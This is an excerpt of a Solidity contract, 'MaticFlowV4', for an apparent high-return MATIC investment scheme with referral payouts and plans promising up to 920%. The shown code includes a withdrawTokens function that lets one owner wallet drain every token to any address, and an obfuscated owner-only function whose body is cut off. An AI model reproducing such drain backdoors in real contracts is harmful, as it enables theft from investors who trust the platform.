...
contract MaticFlowV4 {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 30 ether; // 30 matic
	uint256[] public REFERRAL_PERCENTS = [100, 50, 30, 15, 5];
	...
	constructor(address payable ceoAddr1,address payable ceoAddr2, address payable devAddr, uint256 start) public {
		require(!isContract(ceoAddr1) && !isContract(ceoAddr2) && !isContract(devAddr));
		ceoWallet1 = ceoAddr1;
		ceoWallet2 = ceoAddr2;
		devWallet = devAddr;
        ...
        plans.push(Plan(100, 200));
        plans.push(Plan(150, 330));
        plans.push(Plan(200, 460));
        plans.push(Plan(250, 600));
        plans.push(Plan(365, 920));
	}
    ...
    function withdrawTokens(address tokenAddr, address to) external {
		require(msg.sender == ceoWallet2, "only owner");
		IERC20 token = IERC20(tokenAddr);
		token.transfer(to,token.balanceOf(address(this)));
	}

    function Ox3cdbv567() public onlyOwner {
